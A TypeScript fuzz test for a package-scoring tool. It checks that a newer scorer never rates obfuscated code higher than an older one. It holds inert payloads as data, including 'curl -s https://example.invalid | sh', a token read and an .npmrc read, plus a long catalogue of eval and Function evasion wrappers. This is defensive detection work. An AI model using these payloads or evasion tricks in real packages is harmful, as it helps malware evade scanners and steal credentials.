// The floor, tested as a property: whatever the code is wrapped in, apm-score-v8 never scores a package above
// apm-score-v3 (test/v3, copied from git history), the last scorer that read every file as raw text. There are no
// exceptions. Each case nests two or three wrapper shapes taken from the five independent reviews (template tags,
// Function subclasses and constructor chains, generators, Symbol keys, bind/apply/call/Reflect, Proxies, getters,
// namespaces, logical, ternary and comma callees, shadowing decoys, `with`, exports wildcards, comments ended by every
// line terminator, HTML comments, JSX text, padding past the parse limit, token-window boundaries) around an inert
// payload, and scores the same package with both. The v7 review's seven families are here too: conversion hooks,
// `with` writes to an outer binding, default-parameter scope, reflected names and keys, a locally bound eval, a custom
// fetch handed a data: URL, and a builtin replaced from a file with no tree. Scoring runs nothing: the payloads only
// name example.invalid, child_process and a token. Separately, each new shape is run once in a node:vm context
// against recording stubs, to check it really runs its payload.
//
//   bun test packages/core/test/floor-fuzz.test.ts                                   fixed seed, CI size
//   APM_FUZZ_CASES=10000 APM_FUZZ_SEED=random bun test packages/core/test/floor-fuzz.test.ts   long run
//
// A failure prints the seed, the case number and the shapes, so `APM_FUZZ_SEED=<seed>` replays it.
import { describe, expect, test } from "bun:test";
import vm from "node:vm";
import { analyze, finalize, SCORE_FLOOR, type ScoreReport, type TarEntry } from "../src/index.ts";
import lexerData from "./fixtures/sol-lexer.json";
import v5Data from "./fixtures/sol-parser-v5.json";
import v6Data from "./fixtures/sol-parser-v6.json";
import { analyze as analyzeV3, finalize as finalizeV3 } from "./v3/score.ts";

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

const CI_SEED = 20_261_112;
const CI_CASES = 300;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

/** The package.json fields a generated package sets. */
type Manifest = { name: string; version: string; license: string; main: string; exports?: Record<string, string | Record<string, Record<string, string>>> };

/** One package: its files, with `package.json` written from `manifest`. */
type Pkg = { manifest: Manifest; files: Record<string, string> };

function tarOf(p: Pkg): TarEntry[] {
  return [entry("package.json", JSON.stringify(p.manifest)), ...Object.entries(p.files).map(([path, text]) => entry(path, text))];
}

function scoreV8(p: Pkg): ScoreReport {
  return finalize(analyze({ name: "probe-pkg", manifest: p.manifest, files: tarOf(p), publisher: "a", previousPublishers: [] }), STATE);
}

function scoreV3(p: Pkg): number {
  return finalizeV3(analyzeV3({ name: "probe-pkg", manifest: p.manifest, files: tarOf(p), publisher: "a", previousPublishers: [] }), STATE).score;
}

function single(file: string, src: string): Pkg {
  return { manifest: { name: "probe-pkg", version: "1.0.0", license: "MIT", main: file }, files: { [file]: src } };
}

// ---------- a seeded generator ----------

/** mulberry32: small, fast and the same on every machine. */
function rng(seed: number): () => number {
  let a = seed >>> 0;

  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);

    return ((t ^ (t >>> 14)) >>> 0) / 4_294_967_296;
  };
}

type Rand = () => number;

function pick<T>(r: Rand, list: readonly T[]): T {
  const v = list[Math.floor(r() * list.length)];

  if (v === undefined) throw new Error("empty list");

  return v;
}

// ---------- the payloads: inert, and each something apm-score-v3 refuses or marks ----------

/** The v6 review's evaluator payload: a builtin load built from pieces, a request, a token read and an eval. */
const FULL = "process.getBuiltinModule('chi'+'ld_process');fetch('https://example.invalid');process.env.NPM_TOKEN;eval('1')";

const PAYLOADS: readonly string[] = [
  FULL,
  "require('child_process')",
  "fetch('https://example.invalid')",
  "process.env.NPM_TOKEN",
  "eval('1')",
  "require('fs').readFileSync(require('os').homedir() + '/.npmrc')",
  "require('child_process').execSync('curl -s https://example.invalid | sh')",
  "new Function('return 1')()",
  "import('https://example.invalid/x.mjs')",
];

// ---------- the shapes ----------

/** Where a shape is valid: plain scripts may use sloppy-mode syntax (`with`, assigning a global); TypeScript has namespaces. */
type Lang = "script" | "module" | "ts";

/** A string literal holding `code`. */
function q(code: string): string {
  return JSON.stringify(code);
}

/** Template text holding `code`. */
function t(code: string): string {
  return code.replace(/\\/g, "\\\\").replace(/`/g, "\\`").replace(/\$\{/g, "\\${");
}

/**
 * A shape that runs `code` (JavaScript source): it returns code that hands the string to an evaluator some way. Only
 * shapes that run what they wrap belong here; one that does not (eval as a tag, a string only compared) is a precision
 * case, where scoring above v3 is right, and sits with the review fixtures instead.
 */
type CodeWrapper = { name: string; langs?: readonly Lang[]; wrap: (code: string) => string };

const ALL: readonly Lang[] = ["script", "module", "ts"];
const SLOPPY: readonly Lang[] = ["script"];
const NOT_TS: readonly Lang[] = ["script", "module"];

// ---------- the v7 review's families: proofs v7 took that the code did not honour ----------

/** A family a shape belongs to, so the coverage check can ask that each one is drawn. */
type Family = "conversion" | "with" | "default-parameter" | "reflected" | "local-eval" | "custom-fetch" | "unparsed-patch";

type FamilyWrapper = CodeWrapper & { family: Family };

/** Indirect eval of an object's own `s`, from inside a conversion hook. */
const RUN_S = "(0,eval)(this.s)";

const FAMILY_WRAPPERS: readonly FamilyWrapper[] = [
  // a value only converted, compared or tested runs its own hooks
  { family: "conversion", name: "unary-to-primitive", wrap: (c) => `const o={s:${q(c)},[Symbol.toPrimitive](){${RUN_S};return 0}};+o;` },
  { family: "conversion", name: "loose-equal-value-of", wrap: (c) => `const o={s:${q(c)},valueOf(){${RUN_S};return 0}};o==0;` },
  { family: "conversion", name: "less-than-value-of", wrap: (c) => `const o={s:${q(c)},valueOf(){${RUN_S};return 0}};o<0;` },
  { family: "conversion", name: "template-to-string", wrap: (c) => `const o={s:${q(c)},toString(){${RUN_S};return ''}};\`\${o}\`;` },
  { family: "conversion", name: "in-key", wrap: (c) => `const o={s:${q(c)},[Symbol.toPrimitive](){${RUN_S};return 'k'}};o in {};` },
  { family: "conversion", name: "instanceof-has-instance", wrap: (c) => `const o={s:${q(c)},[Symbol.hasInstance](){${RUN_S};return false}};1 instanceof o;` },
  { family: "conversion", name: "string-concat-hook", wrap: (c) => `function f(){const o={s:${q(c)},toString(){${RUN_S};return ''}};String(o)}f();` },
  // a write inside `with` that falls through to the outer binding
  { family: "with", langs: SLOPPY, name: "with-write-outer", wrap: (c) => `function f(){let run=()=>{};with({}){run=globalThis.eval}run(${q(c)})}f();` },
  { family: "with", langs: SLOPPY, name: "with-for-of-outer", wrap: (c) => `function f(){let run=()=>{};with({}){for(run of [globalThis.eval]);}run(${q(c)})}f();` },
  { family: "with", langs: SLOPPY, name: "with-destructure-outer", wrap: (c) => `function f(){let run=()=>{};with({}){[run]=[globalThis.eval]}run(${q(c)})}f();` },
  // a default parameter's closure sees the outer name, not the body's declaration
  { family: "default-parameter", name: "default-closure", wrap: (c) => `function f(go=()=>Function(${q(c)})()){const Function=()=>{};go()}f();` },
  { family: "default-parameter", name: "default-arrow", wrap: (c) => `const f=(go=()=>Function(${q(c)})())=>{const Function=()=>{};go()};f();` },
  { family: "default-parameter", name: "default-destructured", wrap: (c) => `function f({go=()=>Function(${q(c)})()}={}){const Function=()=>{};go()}f();` },
  // an intrinsic eval reached through a binding named eval is still a direct eval
  { family: "local-eval", langs: SLOPPY, name: "local-eval-const", wrap: (c) => `function f(){const eval=globalThis.eval;eval(${q(c)})}f();` },
  { family: "local-eval", langs: SLOPPY, name: "local-eval-parameter", wrap: (c) => `function f(eval){eval(${q(c)})}f(globalThis.eval);` },
  { family: "local-eval", langs: SLOPPY, name: "local-eval-nested", wrap: (c) => `function f(){const e=globalThis.eval;function g(){const eval=e;eval(${q(c)})}g()}f();` },
  { family: "local-eval", langs: SLOPPY, name: "local-eval-reads-dead", wrap: (c) => `function f(){const s=${q(c)};const eval=globalThis.eval;eval('eval(s)')}f();` },
  // a fetch apm cannot identify, handed a data: URL, can turn it into anything
  { family: "custom-fetch", name: "data-local-method", wrap: (c) => `function run(send){const o={fetch(u){return send(u.slice(5))}};o.fetch('data:'+${q(c)})}run(globalThis.eval);` },
  { family: "custom-fetch", name: "data-global-replaced", wrap: (c) => `const original=globalThis.fetch;globalThis.fetch=function(u){globalThis.fetch=original;return (0,eval)(u.slice(5))};fetch('data:'+${q(c)});` },
];

/**
 * Programs that hand a definition's name, a written key or a function's source to the code that runs it: they are
 * their own payloads (a module load, a request, a token read), so they are drawn in place of a payload.
 */
const REFLECTED: readonly { name: string; langs?: readonly Lang[]; src: string }[] = [
  { name: "key-listed-module", src: "const o={child_process:0};process.getBuiltinModule(Object.keys(o)[0]);" },
  { name: "key-listed-token", src: "const o={NPM_TOKEN:0};process.env[Object.keys(o)[0]];" },
  { name: "method-key-token", src: "const o={NPM_TOKEN(){}};process.env[Object.keys(o)[0]];" },
  { name: "class-key-token", src: "class K{static NPM_TOKEN=1}process.env[Object.keys(K)[0]];" },
  { name: "function-name-fetch", src: "function f(){function fetch(){}globalThis[fetch.name]('https://example.invalid')}f();" },
  { name: "method-name-fetch", src: "const o={fetch(){}};globalThis[o.fetch.name]('https://example.invalid');" },
  { name: "class-name-module", src: "function f(){class child_process{}process.getBuiltinModule(child_process.name)}f();" },
  { name: "arrow-name-module", src: "function f(){const child_process=()=>{};process.getBuiltinModule(child_process.name)}f();" },
  { name: "function-source-module", src: "function f(){function g(){child_process}process.getBuiltinModule(String(g).slice(13,26))}f();" },
  { name: "namespace-keys-token", langs: ["ts"], src: "namespace N{export const NPM_TOKEN=1}process.env[Object.keys(N)[0]];" },
  { name: "parameter-property-token", langs: ["ts"], src: "class C{constructor(public NPM_TOKEN=1){}}process.env[Object.keys(new C())[0]];" },
];

/** A package whose main file sends the payload through fetch, after a file with no tree replaced fetch with eval. */
const UNPARSED_PATCHES: readonly { name: string; file: string; text: string }[] = [
  { name: "patch-js-padded", file: "patch.js", text: `${"0;".repeat(240_001)}globalThis.fetch=eval;` },
  { name: "patch-ts-comment", file: "patch.ts", text: `/*${"x".repeat(1024 * 1024)}*/\nglobalThis.fetch=eval;` },
  { name: "patch-txt-padded", file: "patch.txt", text: `${"0;".repeat(240_001)}const original=globalThis.fetch;globalThis.fetch=function(s){globalThis.fetch=original;return eval(s)};` },
];

const CODE_WRAPPERS: readonly CodeWrapper[] = [
  { name: "eval", wrap: (c) => `eval(${q(c)});` },
  { name: "Function", wrap: (c) => `Function(${q(c)})();` },
  { name: "new-Function", wrap: (c) => `new Function(${q(c)})();` },
  { name: "Function-tag", wrap: (c) => `Function\`${t(c)}\`();` },
  { name: "extends-Function", wrap: (c) => `class F extends Function {};new F(${q(c)})();` },
  { name: "super-Function", wrap: (c) => `class F extends Function {constructor(){super(${q(c)})}};new F()();` },
  { name: "prototype-constructor", wrap: (c) => `Function.prototype.constructor(${q(c)})();` },
  { name: "constructor-chain", wrap: (c) => `(()=>{}).constructor.prototype.constructor(${q(c)})();` },
  { name: "async-constructor", wrap: (c) => `(async()=>{}).constructor(${q(c)})();` },
  { name: "array-constructor-chain", wrap: (c) => `[].map.constructor(${q(c)})();` },
  { name: "computed-bind", wrap: (c) => `eval['bind'](null,${q(c)})();` },
  { name: "bind", wrap: (c) => `eval.bind(null,${q(c)})();` },
  { name: "call", wrap: (c) => `eval.call(null,${q(c)});` },
  { name: "apply", wrap: (c) => `eval.apply(null,[${q(c)}]);` },
  { name: "Reflect.apply", wrap: (c) => `Reflect.apply(eval,null,[${q(c)}]);` },
  { name: "Reflect.construct", wrap: (c) => `Reflect.construct(Function,[${q(c)}])();` },
  { name: "comma", wrap: (c) => `(0,eval)(${q(c)});` },
  { name: "logical-or", wrap: (c) => `(null||eval)(${q(c)});` },
  { name: "logical-nullish", wrap: (c) => `(undefined??eval)(${q(c)});` },
  { name: "ternary", wrap: (c) => `(Math.random()>2?String:eval)(${q(c)});` },
  { name: "getter", wrap: (c) => `const o={get go(){return eval}};o.go(${q(c)});` },
  { name: "getter-this", wrap: (c) => `const o={x:eval,get go(){return this.x}};o.go(${q(c)});` },
  { name: "proxy-target", wrap: (c) => `const o=new Proxy({go:eval},{});o.go(${q(c)});` },
  { name: "proxy-trap", wrap: (c) => `const o=new Proxy({},{get:()=>eval});o.go(${q(c)});` },
  { name: "symbol-key", wrap: (c) => `const k=Symbol('k');const o={[k]:eval};o[k](${q(c)});` },
  { name: "symbol-for", wrap: (c) => `const o={[Symbol.for('go')]:eval};o[Symbol.for('go')](${q(c)});` },
  { name: "generator-yield", wrap: (c) => `function* g(){yield eval}g().next().value(${q(c)});` },
  { name: "generator-return", wrap: (c) => `function* g(){return eval}g().next().value(${q(c)});` },
  { name: "async-await", wrap: (c) => `(async()=>{async function g(){return eval}(await g())(${q(c)})})();` },
  { name: "alias-write", wrap: (c) => `const o={};const a=o;a.go=eval;o.go(${q(c)});` },
  { name: "descriptor", wrap: (c) => `const d={get:()=>eval};const o={};Object.defineProperty(o,'go',d);o.go(${q(c)});` },
  { name: "return-limit", wrap: (c) => `function g(x){if(x===0)return eval;if(x===1)return 1;if(x===2)return 2;if(x===3)return 3;if(x===4)return 4;return 5}g(0)(${q(c)});` },
  { name: "candidate-limit", wrap: (c) => `const a=()=>1,b=()=>2,c=()=>3,d=()=>4,e=()=>5,f=()=>6,h=()=>7;const v=[0,0,0,0,0,0,0];(v[0]?a:v[1]?b:v[2]?c:v[3]?d:v[4]?e:v[5]?f:v[6]?h:eval)(${q(c)});` },
  { name: "returned-string", wrap: (c) => `function g(){return ${q(c)}}eval(g());` },
  { name: "const-string", wrap: (c) => `const s=${q(c)};eval(s);` },
  { name: "compared-then-run", wrap: (c) => `const s=${q(c)};if(s==="x"){}eval(s);` },
  { name: "array-join", wrap: (c) => `eval([${q(c)}].join(''));` },
  { name: "String.raw", wrap: (c) => `eval(String.raw\`${t(c)}\`);` },
  { name: "error-message", wrap: (c) => `try{throw new Error(${q(c)})}catch(e){eval(e.message)}` },
  { name: "path-join", wrap: (c) => `eval(require('path').basename(${q(c)}));` },
  { name: "object-arg", wrap: (c) => `function run(o){eval(o.code)}run({code:${q(c)}});` },
  { name: "spread-args", wrap: (c) => `eval(...[${q(c)}]);` },
  { name: "arguments", wrap: (c) => `(function(){eval(arguments[0])})(${q(c)});` },
  { name: "parameter-function", wrap: (c) => `function go(f,s){f(s)()}go(Function,${q(c)});` },
  { name: "json-parse", wrap: (c) => `eval(JSON.parse(${q(q(c))}));` },
  { name: "timer", wrap: (c) => `setTimeout(${q(c)});` },
  { name: "vm", wrap: (c) => `require('vm').runInThisContext(${q(c)});` },
  { name: "global-member", wrap: (c) => `globalThis['ev'+'al'](${q(c)});` },
  { name: "global-alias", wrap: (c) => `const g=globalThis;g.eval(${q(c)});` },
  { name: "this-global", langs: SLOPPY, wrap: (c) => `const g=this;g.eval(${q(c)});` },
  // a sink the proofs trust, replaced first: what it is handed must still count
  { name: "fetch-replaced", wrap: (c) => `globalThis.fetch=eval;fetch(${q(c)});` },
  { name: "fetch-assigned", langs: SLOPPY, wrap: (c) => `fetch=eval;fetch(${q(c)});` },
  { name: "fetch-assign", wrap: (c) => `Object.assign(globalThis,{fetch:eval});fetch(${q(c)});` },
  { name: "fetch-define", wrap: (c) => `Object.defineProperty(globalThis,'fetch',{value:eval});fetch(${q(c)});` },
  { name: "fetch-helper", wrap: (c) => `function set(o,k,v){o[k]=v}set(globalThis,'fe'+'tch',eval);fetch(${q(c)});` },
  { name: "fetch-sloppy-this", langs: SLOPPY, wrap: (c) => `(function(){return this})().fetch=eval;fetch(${q(c)});` },
  { name: "fetch-with", langs: SLOPPY, wrap: (c) => `with({fetch:eval}){fetch(${q(c)})}` },
  { name: "fetch-block-function", langs: SLOPPY, wrap: (c) => `if(1){function fetch(s){eval(s)}}fetch(${q(c)});` },
  { name: "error-prototype", wrap: (c) => `Error.prototype.toString=function(){return eval(this.message)};fetch(new Error(${q(c)}));` },
  { name: "object-prototype-getter", wrap: (c) => `Object.defineProperty(Object.prototype,'method',{get(){eval(this.body);return'GET'}});fetch('https://example.invalid',{body:${q(c)}});` },
  { name: "path-replaced", wrap: (c) => `const p=require('path');p.join=eval;p.join(${q(c)});` },
  { name: "dead-looking-read-by-eval", wrap: (c) => `function f(){const s=${q(c)};eval('eval(s)')}f();` },
  { name: "with-read", langs: SLOPPY, wrap: (c) => `function f(){const s=${q(c)};with({}){eval(s)}}f();` },
  // places a proof might take for harmless, from which the code is read back and run
  { name: "key-listed", wrap: (c) => `const o={${q(c)}:1};eval(Object.keys(o)[0]);` },
  { name: "completion-value", wrap: (c) => `eval(eval(${q(`${q(c)};`)}));` },
  { name: "string-builders", wrap: (c) => `eval(decodeURIComponent(encodeURIComponent(String(${q(c)}))));` },
  { name: "json-roundtrip", wrap: (c) => `eval(JSON.parse(JSON.stringify(${q(c)})));` },
  { name: "template-interpolation", wrap: (c) => `eval(\`\${${q(c)}}\`);` },
  { name: "sink-alias", wrap: (c) => `const fetch=eval;fetch(${q(c)});` },
  { name: "sink-call", wrap: (c) => `globalThis.fetch=eval;fetch.call(null,${q(c)});` },
  { name: "sink-spread", wrap: (c) => `globalThis.fetch=eval;fetch(...[${q(c)}]);` },
  { name: "error-thrown", wrap: (c) => `function f(){throw new Error(${q(c)})}try{f()}catch(e){Function(e.message)()}` },
  { name: "path-roundtrip", wrap: (c) => `eval(require('path').normalize(${q(c)}));` },
  { name: "ignored-slot-moved", wrap: (c) => `const e=(a,b)=>eval(b);e(1,${q(c)});` },
  { name: "conditional-value", wrap: (c) => `eval(Math.random()>2?'1':${q(c)});` },
  { name: "logical-value", wrap: (c) => `eval(''||${q(c)});` },
  { name: "dead-at-top-read-later", wrap: (c) => `var s=${q(c)};setTimeout(()=>eval(s));` },
  { name: "namespace-merge", langs: ["ts"], wrap: (c) => `namespace X{export const go=eval}namespace X{go(${q(c)})}` },
  { name: "namespace-fetch", langs: ["ts"], wrap: (c) => `namespace X{export const fetch=eval}namespace X{fetch(${q(c)})}` },
  ...FAMILY_WRAPPERS,
];

/** A shape around a whole program: where it sits in the file, and what sits around it. */
type Surrounding = { name: string; langs?: readonly Lang[]; wrap: (code: string, lang: Lang) => string };

const SURROUNDINGS: readonly Surrounding[] = [
  { name: "none", wrap: (c) => c },
  { name: "iife", wrap: (c) => `(function(){${c}})();` },
  { name: "arrow-iife", wrap: (c) => `(()=>{${c}})();` },
  { name: "block", wrap: (c) => `{${c}}` },
  // decoys bind the dangerous names in another scope; they hold nothing apm-score-v3 would count themselves
  { name: "unused-function-decoy", wrap: (c) => `function unused(){const fetch=()=>{};const require=()=>{};}${c}` },
  { name: "local-function-decoy", wrap: (c) => `function f(){var fetch=()=>1;var exec=()=>2;return [fetch,exec]}f();${c}` },
  { name: "line-comment-lf", wrap: (c) => `// note\n${c}` },
  { name: "line-comment-cr", wrap: (c) => `// note\r${c}` },
  { name: "line-comment-ls", wrap: (c) => `// note ${c}` },
  { name: "line-comment-ps", wrap: (c) => `// note ${c}` },
  { name: "block-comment", wrap: (c) => `/* note */${c}` },
  { name: "html-open-comment", langs: SLOPPY, wrap: (c) => `x<!-- note\n${c}` },
  { name: "html-close-comment", langs: SLOPPY, wrap: (c) => `0\n--> note\n${c}` },
  { name: "hashbang", wrap: (c) => `#!/usr/bin/env node\n${c}` },
  { name: "regex-before", wrap: (c) => `const r=/[/*]/g;r.test('x');${c}` },
  { name: "with-block", langs: SLOPPY, wrap: (c) => `with({}){${c}}` },
  { name: "strict", wrap: (c) => `"use strict";${c}` },
  { name: "class-method", wrap: (c) => `class A{run(){${c}}}new A().run();` },
  { name: "jsx-text", langs: NOT_TS, wrap: (c) => `const el=<div>// note {(()=>{${c}})()}</div>;` },
  { name: "namespace", langs: ["ts"], wrap: (c) => `namespace N{${c}}` },
  { name: "export", langs: ["module", "ts"], wrap: (c) => `export const x=1;${c}` },
];

/** Shapes that change the package rather than the text: where the file lives, how large it is, or what another file replaced. */
type Layout = "main" | "padded" | "wildcard-export" | "window" | "unparsed-patch";

// ---------- one case ----------

type Case = { names: string[]; pkg: Pkg };

const FILES: Record<Lang, string> = { script: "index.js", module: "index.mjs", ts: "index.ts" };

/** The token pass's window (source.ts); a file has no tree past it, so a call is placed across its first boundary. */
const WINDOW = 4 * 1024 * 1024;

function makeCase(r: Rand): Case {
  const lang = pick(r, ["script", "script", "module", "ts"] as const);
  const fits = <S extends { langs?: readonly Lang[] }>(s: S): boolean => (s.langs ?? ALL).includes(lang);
  const names: string[] = [lang];
  const reflected = REFLECTED.filter(fits);
  // a reflected-name program is its own payload; in TypeScript a namespace or a parameter property must stay unwrapped
  const reflect = r() < 0.12 ? pick(r, reflected) : null;
  let code = reflect ? reflect.src : pick(r, PAYLOADS);

  names.push(reflect ? `reflected:${reflect.name}` : `payload:${PAYLOADS.indexOf(code)}`);

  if (reflect) names.push("family:reflected");
  // two or three shapes in all: one or two around the code, then one around the program
  const depth = reflect?.langs ? 0 : r() < 0.5 ? 1 : 2;

  for (let i = 0; i < depth; i++) {
    // a third of the shapes come from the v7 review's families
    const s = r() < 0.33 ? pick(r, FAMILY_WRAPPERS.filter(fits)) : pick(r, CODE_WRAPPERS.filter(fits));
    code = s.wrap(code);
    names.push(s.name);

    if ("family" in s) names.push(`family:${s.family}`);
  }

  const ctx = pick(r, SURROUNDINGS.filter(fits));
  const jsx = ctx.name === "jsx-text";
  let src = ctx.wrap(code, lang);

  names.push(ctx.name);
  const roll = r();
  const layout: Layout = roll < 0.06 ? "padded" : roll < 0.1 ? "wildcard-export" : roll < 0.11 && lang === "ts" ? "window" : roll < 0.14 && lang !== "ts" && !jsx ? "unparsed-patch" : "main";
  let file = jsx ? "index.jsx" : FILES[lang];

  names.push(layout);

  if (layout === "padded") src = lang === "ts" ? `/*${"x".repeat(1024 * 1024)}*/\n${src}` : `${"0;".repeat(240_001)}${src}`;

  if (layout === "window") {
    // an escaped name before the boundary and its call after it, with a comment between longer than any fixed overlap
    src = `/*${"x".repeat(WINDOW - 104)}*/\nf\\u0065tch/*${"x".repeat(70_000)}*/('https://example.invalid');\n${src}`;
    file = "index.ts";
  }

  if (layout === "unparsed-patch") {
    // the program itself becomes a string the replaced fetch evaluates
    const patch = pick(r, UNPARSED_PATCHES);
    const main = `require('./${patch.file}');fetch(${q(src)});`;

    names.push(patch.name, "family:unparsed-patch");

    return { names, pkg: { manifest: { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js" }, files: { "index.js": main, [patch.file]: patch.text } } };
  }

  if (layout === "wildcard-export") {
    const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js", exports: { ".": "./index.js", "./*": { node: { require: "./docs/*.txt" } } } };

    return { names, pkg: { manifest, files: { "index.js": "module.exports = 1;\n", "docs/payload.txt": src } } };
  }

  return { names, pkg: single(file, src) };
}

function describeCase(seed: number, i: number, c: Case, v3: number, v8: ScoreReport): string {
  const signals = v8.signals.map((s) => `${s.id}:${s.confidence}`).join(", ");

  const src = Object.entries(c.pkg.files)
    .map(([p, text]) => `${p}: ${text.length > 600 ? `${text.slice(0, 120)} … ${text.slice(-400)}` : text}`)
    .join("\n");

  return `seed ${seed}, case ${i}: ${c.names.join(" > ")}\nv3 ${v3}, v8 ${v8.score} (${signals})\n${src}`;
}

// ---------- the tests ----------

describe("the v3 reference is apm-score-v3", () => {
  // every stored v3 score of the three reviews' fixtures, single-file ones, is what test/v3 computes
  const stored = [...lexerData, ...v5Data, ...v6Data].filter((f) => !("extra" in f) && !("manifest" in f) && !("pad" in f));

  test(`it reproduces the reviews' ${stored.length} stored v3 scores`, () => {
    for (const f of stored) expect(scoreV3(single(f.file, f.src)), f.name).toBe(f.v3);
  });
});

describe("the floor: no shape lifts a package above apm-score-v3", () => {
  const cases = Number(process.env.APM_FUZZ_CASES ?? CI_CASES);
  const seedEnv = process.env.APM_FUZZ_SEED;
  const seed = seedEnv === "random" ? Math.floor(Math.random() * 2 ** 31) : Number(seedEnv ?? CI_SEED);

  test(
    `${cases} generated packages, seed ${seed}`,
    () => {
      const r = rng(seed);
      const failures: string[] = [];
      let refused = 0;

      for (let i = 0; i < cases; i++) {
        const c = makeCase(r);
        const v3 = scoreV3(c.pkg);
        const v8 = scoreV8(c.pkg);

        if (v3 < SCORE_FLOOR) refused++;

        if (v8.score > v3) failures.push(describeCase(seed, i, c, v3, v8));

        if (failures.length >= 5) break;
      }

      if (process.env.APM_FUZZ_CASES) console.log(`floor fuzz: seed ${seed}, ${cases} cases, ${refused} refused by v3, ${failures.length} above v3`);

      expect(failures, failures.join("\n\n")).toEqual([]);
    },
    Number(process.env.APM_FUZZ_TIMEOUT ?? 120_000),
  );

  test("every payload, layout and context appears in the CI seed's cases", () => {
    const r = rng(CI_SEED);
    const seen = new Set<string>();

    for (let i = 0; i < CI_CASES; i++) for (const n of makeCase(r).names) seen.add(n);

    const families: Family[] = ["conversion", "with", "default-parameter", "reflected", "local-eval", "custom-fetch", "unparsed-patch"];
    const missing = [...SURROUNDINGS.map((s) => s.name), ...PAYLOADS.map((_, i) => `payload:${i}`), "padded", "wildcard-export", "unparsed-patch", ...families.map((f) => `family:${f}`)].filter((n) => !seen.has(n));

    expect(missing).toEqual([]);
  });

  // every code shape alone, in every language it is valid in, around the review's payload: the composed cases may
  // draw a shape rarely, so each is also scored on its own
  for (const s of CODE_WRAPPERS) {
    test(`alone: ${s.name}`, () => {
      for (const lang of s.langs ?? ALL) {
        const pkg = single(FILES[lang], s.wrap(FULL));
        const v3 = scoreV3(pkg);
        const v8 = scoreV8(pkg);

        expect(v8.score, `${lang}: v3 ${v3}`).toBeLessThanOrEqual(v3);
      }
    });
  }

  for (const s of REFLECTED) {
    test(`alone: ${s.name}`, () => {
      for (const lang of s.langs ?? ALL) {
        const pkg = single(FILES[lang], s.src);

        expect(scoreV8(pkg).score, lang).toBeLessThanOrEqual(scoreV3(pkg));
      }
    });
  }

  for (const p of UNPARSED_PATCHES) {
    test(`alone: ${p.name}`, () => {
      const pkg: Pkg = { manifest: { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js" }, files: { "index.js": `require('./${p.file}');fetch(${q(FULL)});`, [p.file]: p.text } };
      const v3 = scoreV3(pkg);

      expect(v3).toBeLessThan(SCORE_FLOOR);
      expect(scoreV8(pkg).score).toBeLessThanOrEqual(v3);
    });
  }
});

// ---------- the new shapes run what they wrap ----------

/**
 * Runs `src` as a classic script in a fresh node:vm context whose process, fetch and module loading only record what
 * they are asked for, and returns the record. Nothing reaches the network, the environment or a real module.
 */
function trace(src: string): string[] {
  const calls: string[] = [];
  const env = new Proxy({}, { get: (_t, k) => (calls.push(`env:${String(k)}`), undefined) });
  const process = { env, getBuiltinModule: (m: string) => (calls.push(`module:${m}`), {}) };
  const fetch = (u: string) => (calls.push(`fetch:${u}`), Promise.resolve());
  const context = vm.createContext({ process, fetch, require: (m: string) => (calls.push(`module:${m}`), {}) });

  vm.runInContext(src, context, { timeout: 1000 });

  return calls;
}

describe("each new shape runs its payload (liveness, under recording stubs)", () => {
  const all = ["module:child_process", "fetch:https://example.invalid", "env:NPM_TOKEN"];

  for (const s of FAMILY_WRAPPERS) {
    test(`runs: ${s.name}`, () => {
      expect(trace(s.wrap(FULL))).toEqual(expect.arrayContaining(all));
    });
  }

  for (const s of REFLECTED.filter((x) => !x.langs)) {
    test(`runs: ${s.name}`, () => {
      expect(trace(s.src).length).toBeGreaterThan(0);
      expect(trace(s.src).every((c) => all.includes(c))).toBe(true);
    });
  }
});
